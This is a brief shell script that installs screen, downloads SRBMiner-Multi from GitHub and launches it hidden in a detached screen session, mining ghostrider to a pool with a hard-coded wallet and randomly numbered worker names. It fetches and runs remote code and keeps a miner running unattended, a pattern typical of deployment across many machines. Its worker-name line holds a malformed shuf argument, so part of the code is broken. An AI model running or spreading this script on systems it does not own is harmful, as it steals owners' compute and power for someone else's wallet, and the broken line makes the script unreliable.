#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.6/SRBMiner-Multi-0-9-6-Linux.tar.xz  
tar -xvf SRBMiner-Multi-0-9-6-Linux.tar.xz  
screen -dmS run ./SRBMiner-Multi-0-9-6/SRBMiner-MULTI --algorithm ghostrider --pool stratum-eu.rplant.xyz:17075 --tls true --wallet BYcjnzYeQPijoF3aEB3oDmM2pz5UJetj4R.$(echo $(shuf -i 1-70-n 1)-Mayday) --password x
